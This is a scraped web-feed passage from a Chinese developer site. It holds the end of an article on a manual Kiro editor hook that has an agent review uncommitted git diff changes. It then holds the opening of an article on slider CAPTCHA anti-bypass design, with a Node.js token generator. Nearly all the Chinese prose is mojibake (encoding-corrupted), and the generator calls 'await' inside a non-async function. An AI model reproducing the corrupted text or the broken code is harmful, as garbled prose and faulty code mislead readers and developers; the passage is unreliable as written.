<p>æˆ‘æƒ³è¦çœŸæ­£å†™å®Œä¸€ä¸ªåŠŸèƒ½åï¼Œåœ¨æäº¤<code>git</code>ä»“åº“å‰å†æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„é—®é¢˜ï¼šæˆ‘ä»¬æƒ³åœ¨å®Œæˆäº†ä¸€æ®µå·¥ä½œåï¼Œè¿›è¡Œé˜¶æ®µæ€§çš„æ£€æŸ¥ï¼Œä¸”ä¸è¦å…¨æ–‡æ£€æŸ¥ï¼Œåªé’ˆå¯¹ä¿®æ”¹éƒ¨åˆ†çš„ä¸Šä¸‹æ–‡ï¼Œä¸”å®ç°åªæ˜¯ç‚¹ç‚¹æŒ‰é’®å°±èƒ½æ£€æŸ¥ã€‚</p>
</blockquote>
<p><strong>é…ç½®è§„åˆ™å¦‚ä¸‹ï¼š</strong></p>
<pre><code class="hljs language-swift" lang="swift">{
  <span class="hljs-string">"enabled"</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"ä»£ç å®¡æŸ¥ä¸ä¿®å¤"</span>,
  <span class="hljs-string">"description"</span>: <span class="hljs-string">"æ‰‹åŠ¨è§¦å‘ï¼ŒæŒ‰ç…§ code-review-checklist è§„èŒƒæ£€æŸ¥å½“å‰æ‰“å¼€çš„æ–‡ä»¶ï¼Œå‘ç°é—®é¢˜ç›´æ¥ä¿®å¤"</span>,
  <span class="hljs-string">"version"</span>: <span class="hljs-string">"1"</span>,
  <span class="hljs-string">"when"</span>: {
    <span class="hljs-string">"type"</span>: <span class="hljs-string">"userTriggered"</span>
  },
  <span class="hljs-string">"then"</span>: {
    <span class="hljs-string">"type"</span>: <span class="hljs-string">"askAgent"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>1. è¿è¡Œ `git diff` è·å–æœ¬æ¬¡æ‰€æœ‰æœªæäº¤çš„æ”¹åŠ¨<span class="hljs-subst">\n</span>2. åªå…³æ³¨æˆ‘ä¿®æ”¹çš„ä»£ç åŠå…¶ä¸Šä¸‹æ–‡ï¼ˆä¿®æ”¹è¡Œçš„å‰åç›¸å…³é€»è¾‘ï¼‰ï¼Œä¸è¦å®¡æŸ¥æ–‡ä»¶ä¸­æœªæ”¹åŠ¨çš„éƒ¨åˆ†<span class="hljs-subst">\n</span>3. å¯¹æ¯ä¸ªæ”¹åŠ¨ï¼ŒæŒ‰ç…§ code-review-checklist.md è§„èŒƒæ£€æŸ¥ï¼š<span class="hljs-subst">\n</span>   - æ–°å¢çš„ setInterval/setTimeout æ˜¯å¦æœ‰å¯¹åº”çš„æ¸…é™¤<span class="hljs-subst">\n</span>   - æ–°å¢çš„å¼‚æ­¥è¯·æ±‚æ˜¯å¦æœ‰ try-catch å’Œ loading çŠ¶æ€ç®¡ç†<span class="hljs-subst">\n</span>   - æ–°å¢çš„ watch æ˜¯å¦æœ‰é˜²é‡å¤æœºåˆ¶<span class="hljs-subst">\n</span>   - ä¿®æ”¹éƒ¨åˆ†æ˜¯å¦å­˜åœ¨ç©ºå€¼é£é™©ï¼ˆç¼ºå°‘å¯é€‰é“¾ã€æ•°ç»„åˆ¤ç©ºç­‰ï¼‰<span class="hljs-subst">\n</span>   - æ–°å¢çš„æŒ‰é’®äº‹ä»¶æ˜¯å¦æœ‰é˜²é‡å¤æäº¤<span class="hljs-subst">\n</span>   - ä¿®æ”¹éƒ¨åˆ†çš„çŠ¶æ€ç®¡ç†æ˜¯å¦ä¸€è‡´<span class="hljs-subst">\n</span>4. åªæŠ¥å‘Šå’Œä¿®å¤æ”¹åŠ¨éƒ¨åˆ†å¼•å…¥çš„é—®é¢˜ï¼Œå·²æœ‰ä»£ç å³ä½¿ä¸å®Œç¾ä¹Ÿä¸è¦åŠ¨<span class="hljs-subst">\n</span>5. ä¿®å¤åç®€è¦è¯´æ˜ï¼šæ”¹äº†å“ªä¸ªæ–‡ä»¶çš„å“ªéƒ¨åˆ†ã€é—®é¢˜æ˜¯ä»€ä¹ˆã€æ€ä¹ˆä¿®çš„"</span>
  }
}

</code></pre>
<p><strong>ç›¸æ¯”ä¸Šé¢çš„è‡ªåŠ¨è§„åˆ™ï¼Œè¿™ä¸ªæ‰‹åŠ¨çš„<code>hook</code>å¦‚ä½•è§¦å‘ï¼Ÿï¼š</strong></p>
<blockquote>
<p>åœ¨<code>Kiro</code>ç¼–è¾‘å™¨çš„æœ€å·¦ä¾§æ‰¾åˆ°è¿™ä¸ªæ–¹æ¡†ä¸­çš„å›¾æ ‡ï¼Œç‚¹å‡»åæ‰¾åˆ°ä½ çš„<code>Hooks</code> åˆ—è¡¨ï¼Œåœ¨åˆ—è¡¨é‡Œæ‰¾åˆ°ä½ æƒ³è¦æ‰§è¡Œçš„ <code>hook</code> ï¼Œç‚¹å‡»å³ä¾§çš„æ‰§è¡ŒæŒ‰é’®å³å¯è§£æ”¾åŒæ‰‹ï¼</p>
</blockquote>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ebbc51968f6e4964b20ba57270e34159~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=991&amp;h=776&amp;s=130016&amp;e=png&amp;b=222222" alt="3c5e7380-9ba1-4ee3-8dc0-32941b4d61a5.png" loading="lazy"/></p>
<p><strong>è§¦å‘åå®ƒä¼šå˜æˆä¸€ä¸ªæ‰§è¡Œä¸­çš„çŠ¶æ€ï¼š</strong></p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/19388b85cb8a42579165dc8e77100b0d~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=571&amp;h=396&amp;s=30603&amp;e=png&amp;b=262628" alt="18e2ee33-b198-4b87-aae1-b05ebf020da3.png" loading="lazy"/></p>
<p><strong>æ‰§è¡Œç»“æŸï¼š</strong></p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/207f1b6e67c1445fa164fca2e054143b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=693&amp;h=430&amp;s=100668&amp;e=png&amp;b=212121" alt="368d2360-e2de-4964-a9cc-39804281a553.png" loading="lazy"/></p>
<p><strong>å°ç»“ï¼š</strong></p>
<blockquote>
<p>ç°åœ¨æ˜¯ä¸æ˜¯æœ‰ç§è§£æ”¾åŒæ‰‹çš„å¿«æ„Ÿï¼ŸğŸ˜‚ æˆ‘ä»¬ç”¨<code>Skills</code> å’Œ <code>Hook</code> è”åŠ¨ï¼Œå®ç°<code>AI</code>å†™ä»£ç è‡ªåŠ¨æ£€æŸ¥æ˜¯å¦ç¬¦åˆæˆ‘ä»¬çš„è§„èŒƒï¼Œåœ¨æäº¤ä»£ç å‰æ£€æŸ¥å½“å‰çš„ä¿®æ”¹æ˜¯å¦ä¼šå¯¹åŸé€»è¾‘é€ æˆä¼¤å®³ï¼Œå¤§å¤§å‡å°‘äº†<code>bug</code>çš„äº§å‡ºã€‚</p>
</blockquote>
<hr/>
<p><strong>å…³äº<code>AI</code>ä½ æœ‰å“ªäº›å¥½ç”¨çš„å·¥å…·ä¹Ÿæ¬¢è¿è¯„è®ºåŒºç•™è¨€ï¼Œä¸€èµ·æ¥æ¢ç´¢ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£æ»‘å—éªŒè¯ç ï¼šé‚£äº›ä½ ä¸çŸ¥é“çš„é˜²ç ´è§£æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7604093823959072787</link>    <guid>https://juejin.cn/post/7604093823959072787</guid>    <pubDate>2026-02-09T07:28:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604093823959072787" data-draft-id="7604175912481488902" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£æ»‘å—éªŒè¯ç ï¼šé‚£äº›ä½ ä¸çŸ¥é“çš„é˜²ç ´è§£æœºåˆ¶"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Canvas"/> <meta itemprop="datePublished" content="2026-02-09T07:28:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iDaoæŠ€æœ¯é­”æ–¹"/> <meta itemprop="url" content="https://juejin.cn/user/166781496080782"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£æ»‘å—éªŒè¯ç ï¼šé‚£äº›ä½ ä¸çŸ¥é“çš„é˜²ç ´è§£æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/166781496080782/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iDaoæŠ€æœ¯é­”æ–¹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:28:28.000Z" title="Mon Feb 09 2026 07:28:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„å°´å°¬ï¼šæ˜æ˜è‡ªå·±æ˜¯ä¸ªçœŸäººï¼Œå´è¢«éªŒè¯ç æŠ˜ç£¨å¾—æ€€ç–‘äººç”Ÿï¼Ÿæ®ç»Ÿè®¡ï¼Œä¼ ç»Ÿå›¾æ–‡éªŒè¯ç çš„ç”¨æˆ·æ”¾å¼ƒç‡é«˜è¾¾40%ã€‚ä½†ä½ çŸ¥é“å—ï¼Ÿæ»‘å—éªŒè¯ç èƒŒåè—ç€ä¸€å¥—ç²¾å¯†çš„é˜²ç ´è§£æœºåˆ¶ï¼Œå®ƒå°±åƒæ˜¯ä¸€ä½ç»éªŒä¸°å¯Œçš„å®‰æ£€å‘˜ï¼Œåœ¨æ¯«ç§’ä¹‹é—´é€šè¿‡ä½ çš„"å¾®è¡¨æƒ…"åˆ¤æ–­ä½ æ˜¯ä¸æ˜¯çœŸäººã€‚</p>
</blockquote>
<h2 data-id="heading-0">ğŸ“‹ ç›®å½•</h2>
<ul>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%83%BD%E5%8F%96%E4%BB%A3%E4%BC%A0%E7%BB%9F%E9%AA%8C%E8%AF%81%E7%A0%81" title="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%83%BD%E5%8F%96%E4%BB%A3%E4%BC%A0%E7%BB%9F%E9%AA%8C%E8%AF%81%E7%A0%81">ä¸ºä»€ä¹ˆæ»‘å—éªŒè¯ç èƒ½å–ä»£ä¼ ç»ŸéªŒè¯ç ï¼Ÿ</a></li>
<li><a href="#%E7%AC%AC%E4%B8%80%E9%81%93%E9%98%B2%E7%BA%BF%E4%BD%8D%E7%BD%AE%E9%AA%8C%E8%AF%81" title="#%E7%AC%AC%E4%B8%80%E9%81%93%E9%98%B2%E7%BA%BF%E4%BD%8D%E7%BD%AE%E9%AA%8C%E8%AF%81">ç¬¬ä¸€é“é˜²çº¿ï¼šä½ç½®éªŒè¯</a></li>
<li><a href="#%E7%AC%AC%E4%BA%8C%E9%81%93%E9%98%B2%E7%BA%BF%E8%BD%A8%E8%BF%B9%E9%9D%9E%E7%BA%BF%E6%80%A7%E6%A3%80%E6%B5%8B" title="#%E7%AC%AC%E4%BA%8C%E9%81%93%E9%98%B2%E7%BA%BF%E8%BD%A8%E8%BF%B9%E9%9D%9E%E7%BA%BF%E6%80%A7%E6%A3%80%E6%B5%8B">ç¬¬äºŒé“é˜²çº¿ï¼šè½¨è¿¹éçº¿æ€§æ£€æµ‹</a></li>
<li><a href="#%E7%AC%AC%E4%B8%89%E9%81%93%E9%98%B2%E7%BA%BF%E9%80%9F%E5%BA%A6%E5%8F%98%E5%8C%96%E5%88%86%E6%9E%90" title="#%E7%AC%AC%E4%B8%89%E9%81%93%E9%98%B2%E7%BA%BF%E9%80%9F%E5%BA%A6%E5%8F%98%E5%8C%96%E5%88%86%E6%9E%90">ç¬¬ä¸‰é“é˜²çº¿ï¼šé€Ÿåº¦å˜åŒ–åˆ†æ</a></li>
<li><a href="#%E7%AC%AC%E5%9B%9B%E9%81%93%E9%98%B2%E7%BA%BF%E5%8A%A0%E9%80%9F%E5%BA%A6%E6%A8%A1%E5%BC%8F%E8%AF%86%E5%88%AB" title="#%E7%AC%AC%E5%9B%9B%E9%81%93%E9%98%B2%E7%BA%BF%E5%8A%A0%E9%80%9F%E5%BA%A6%E6%A8%A1%E5%BC%8F%E8%AF%86%E5%88%AB">ç¬¬å››é“é˜²çº¿ï¼šåŠ é€Ÿåº¦æ¨¡å¼è¯†åˆ«</a></li>
<li><a href="#%E7%AC%AC%E4%BA%94%E9%81%93%E9%98%B2%E7%BA%BF%E6%97%B6%E9%97%B4%E7%AA%97%E5%8F%A3%E6%8E%A7%E5%88%B6" title="#%E7%AC%AC%E4%BA%94%E9%81%93%E9%98%B2%E7%BA%BF%E6%97%B6%E9%97%B4%E7%AA%97%E5%8F%A3%E6%8E%A7%E5%88%B6">ç¬¬äº”é“é˜²çº¿ï¼šæ—¶é—´çª—å£æ§åˆ¶</a></li>
<li><a href="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88" title="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88">å®æˆ˜æ¼”ç¤ºï¼šä¼ä¸šçº§å®ç°æ–¹æ¡ˆ</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E4%B8%8E%E5%8F%8D%E5%88%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98" title="#%E7%BB%95%E8%BF%87%E4%B8%8E%E5%8F%8D%E5%88%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98">ç»•è¿‡ä¸ååˆ¶ï¼šæ”»é˜²å®æˆ˜</a></li>
<li><a href="#%E8%BF%9B%E9%98%B6%E6%80%9D%E8%80%83%E5%AF%B9%E6%8A%97captcha%E5%86%9C%E5%9C%BA" title="#%E8%BF%9B%E9%98%B6%E6%80%9D%E8%80%83%E5%AF%B9%E6%8A%97captcha%E5%86%9C%E5%9C%BA">è¿›é˜¶æ€è€ƒï¼šå¯¹æŠ—CAPTCHAå†œåœº</a></li>
<li><a href="#%E6%80%BB%E7%BB%93" title="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ul>
<h2 data-id="heading-1">ä¸ºä»€ä¹ˆæ»‘å—éªŒè¯ç èƒ½å–ä»£ä¼ ç»ŸéªŒè¯ç ï¼Ÿ</h2>
<p>è¿˜è®°å¾—é‚£ä¸ªè¢«æŠ˜ç£¨åˆ°æ€€ç–‘äººç”Ÿçš„æ—¶åˆ»å—ï¼Ÿæ‰­æ›²çš„å­—æ¯ã€æ¨¡ç³Šçš„å›¾åƒã€"è¯·ç‚¹å‡»æ‰€æœ‰åŒ…å«çº¢ç»¿ç¯çš„å›¾ç‰‡"â€¦â€¦ä¼ ç»ŸéªŒè¯ç å°±åƒæ˜¯ä¸€ä¸ªæ•…æ„åˆéš¾ä½ çš„é—¨å«ï¼Œè€Œæ»‘å—éªŒè¯ç åˆ™æ›´åƒæ˜¯ä¸€ä½è§‚å¯Ÿå…¥å¾®çš„å¿ƒç†å­¦å®¶ã€‚</p>
<p>æ ¹æ® Journal of Information Security and Applications 2024 å¹´çš„ç ”ç©¶æ•°æ®æ˜¾ç¤ºï¼Œæ»‘å—éªŒè¯ç çš„ç”¨æˆ·å®Œæˆç‡æ¯”ä¼ ç»ŸéªŒè¯ç é«˜å‡º35%ï¼Œè€Œç ´è§£éš¾åº¦å´æå‡äº†2.3å€ã€‚è¿™ç§"åŒèµ¢"æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿ</p>
<h3 data-id="heading-2">æ»‘å—éªŒè¯ç çš„æ¼”è¿›å²</h3>
<pre><code class="hljs">ç¬¬ä¸€ä»£ï¼šçº¯ä½ç½®éªŒè¯ï¼ˆ2012-2015ï¼‰
   â””â”€ åªéªŒè¯æ»‘å—æœ€ç»ˆä½ç½®æ˜¯å¦æ­£ç¡®
   â””â”€ å¼±ç‚¹ï¼šå®¹æ˜“è¢«è„šæœ¬ç›´æ¥è®¾ç½®ä½ç½®

ç¬¬äºŒä»£ï¼šæ—¶é—´çª—å£éªŒè¯ï¼ˆ2015-2018ï¼‰
   â””â”€ å¢åŠ å®Œæˆæ—¶é—´æ£€æµ‹
   â””â”€ å¼±ç‚¹ï¼šå¯ä»¥é€šè¿‡å»¶æ—¶æ¨¡æ‹Ÿ

ç¬¬ä¸‰ä»£ï¼šè½¨è¿¹åˆ†æï¼ˆ2018-2021ï¼‰
   â””â”€ åˆ†ææ‹–åŠ¨è¿‡ç¨‹ä¸­çš„è½¨è¿¹ç‚¹
   â””â”€ å¼±ç‚¹ï¼šè½¨è¿¹å¯è¢«å½•åˆ¶é‡æ”¾

ç¬¬å››ä»£ï¼šè¡Œä¸ºæŒ‡çº¹ï¼ˆ2021-è‡³ä»Šï¼‰
   â””â”€ å¤šç»´åº¦è¡Œä¸ºç‰¹å¾åˆ†æ
   â””â”€ æœºå™¨å­¦ä¹ è¾…åŠ©åˆ¤æ–­
   â””â”€ å½“å‰ä¸»æµæ–¹æ¡ˆ
</code></pre>
<p>ç°åœ¨çš„æ»‘å—éªŒè¯ç æ—©å·²ä¸æ˜¯ç®€å•çš„"æ‹–åŠ¨åˆ°ä½"é‚£ä¹ˆç®€å•ã€‚å®ƒèƒŒåè¿è¡Œç€ä¸€å¥—å¤æ‚çš„è¡Œä¸ºåˆ†æç³»ç»Ÿï¼Œå°±åƒæ˜¯ä½ å»é¢è¯•æ—¶ï¼ŒHRä¸ä»…çœ‹ä½ çš„ç®€å†ï¼Œè¿˜ä¼šè§‚å¯Ÿä½ çš„è‚¢ä½“è¯­è¨€ã€è¯­é€Ÿå˜åŒ–ã€ç”šè‡³å¾®è¡¨æƒ…ã€‚</p>
<h2 data-id="heading-3">ç¬¬ä¸€é“é˜²çº¿ï¼šä½ç½®éªŒè¯</h2>
<p>è¿™æ˜¯æœ€åŸºç¡€çš„ä¸€å±‚é˜²æŠ¤ï¼Œå°±åƒæ˜¯ä½ å»å…¬å¸é¢è¯•éœ€è¦åˆ°è¾¾æ­£ç¡®çš„æ¥¼å±‚ä¸€æ ·ã€‚çœ‹ä¼¼ç®€å•ï¼Œä½†è¿™é‡Œé¢ä¹Ÿæœ‰é—¨é“ã€‚</p>
<h3 data-id="heading-4">åŸç†è¯´æ˜</h3>
<p>æœåŠ¡å™¨ç”ŸæˆéªŒè¯ç æ—¶ï¼Œä¼šéšæœºäº§ç”Ÿä¸€ä¸ªç›®æ ‡ä½ç½®åæ ‡ <code>(targetX, targetY)</code>ï¼Œå¹¶å­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼ˆé€šå¸¸é…åˆRedisè®¾ç½®è¿‡æœŸæ—¶é—´ï¼‰ã€‚å‰ç«¯éœ€è¦å°†æ»‘å—æ‹–åŠ¨åˆ°è¿™ä¸ªä½ç½®é™„è¿‘ï¼ˆå…è®¸ä¸€å®šçš„è¯¯å·®èŒƒå›´ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡ç«¯ç”ŸæˆéªŒè¯ç ç¤ºä¾‹ï¼ˆNode.jsï¼‰</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">generateCaptcha</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç”Ÿæˆéšæœºç›®æ ‡ä½ç½®ï¼ˆå‡è®¾æ»‘æ§½å®½åº¦ä¸º300pxï¼‰</span>
  <span class="hljs-keyword">const</span> targetX = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">250</span>) + <span class="hljs-number">20</span>; <span class="hljs-comment">// 20-270ä¹‹é—´</span>
  
  <span class="hljs-comment">// ç”Ÿæˆå”¯ä¸€token</span>
  <span class="hljs-keyword">const</span> token = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'hex'</span>);
  
  <span class="hljs-comment">// å­˜å‚¨åˆ°Redisï¼Œè®¾ç½®5åˆ†é’Ÿè¿‡æœŸ</span>
  <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">setex</span>(<span class="hljs-string">`captcha:<span class="hljs-subst">${token}</span>`</span>, <span class="hljs-number">300</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
    targetX,
    <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
  }));
  
  <span class="hljs-keyword">return</span> { token, targetX };
}
</code></pre>
<h3 data-id="heading-5">å…³é”®ç»†èŠ‚</h3>
<p><strong>è¯¯å·®å®¹å¿åº¦</strong>ï¼šé€šå¸¸å…è®¸ Â±5px çš„è¯¯å·®èŒƒå›´ã€‚å¤ªå°ä¼šå¯¼è‡´ç”¨æˆ·ä½“éªŒå·®ï¼Œå¤ªå¤§ä¼šé™ä½å®‰å…¨æ€§ã€‚</p>
<p><strong>åæ ‡åŠ å¯†</strong>ï¼šå‰ç«¯ä¸åº”ç›´æ¥çŸ¥é“ç›®æ ‡ä½ç½®ã€‚æ­£ç¡®çš„åšæ³•æ˜¯è®©åç«¯è¿”å›ä¸€ä¸ªåŠ å¯†çš„ç›®æ ‡ä½ç½®ï¼Œæˆ–è€…ä½¿ç”¨å›¾ç‰‡èƒŒæ™¯ä¸Šçš„ç¼ºå£ä½ç½®ä½œä¸ºå‚ç…§ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é”™è¯¯åšæ³• âŒ</span>
<span class="hljs-keyword">const</span> targetX = <span class="hljs-number">156</span>; <span class="hljs-comment">// å‰ç«¯ç¡¬ç¼–ç æˆ–ä»æ¥å£æ˜æ–‡è·å–</span>

<span class="hljs-comment">// æ­£ç¡®åšæ³• âœ…</span>
<span class="hljs-comment">// åç«¯è¿”å›ä¸€å¼ å¸¦æœ‰ç¼ºå£çš„èƒŒæ™¯å›¾</span>
<span class="hljs-comment">// ç¼ºå£ä½ç½®å°±æ˜¯ç›®æ ‡ä½ç½®ï¼Œå‰ç«¯ä¸éœ€è¦çŸ¥é“å…·ä½“æ•°å€¼</span>
<span class="hljs-comment">// éªŒè¯æ—¶åç«¯å¯¹æ¯”å‰ç«¯æäº¤çš„åæ ‡ä¸ç¼ºå£ä½ç½®</span>
</code></pre>
<h2 data-id="heading-6">ç¬¬äºŒé“é˜²çº¿ï¼šè½¨è¿¹éçº¿æ€§æ£€æµ‹</h2>
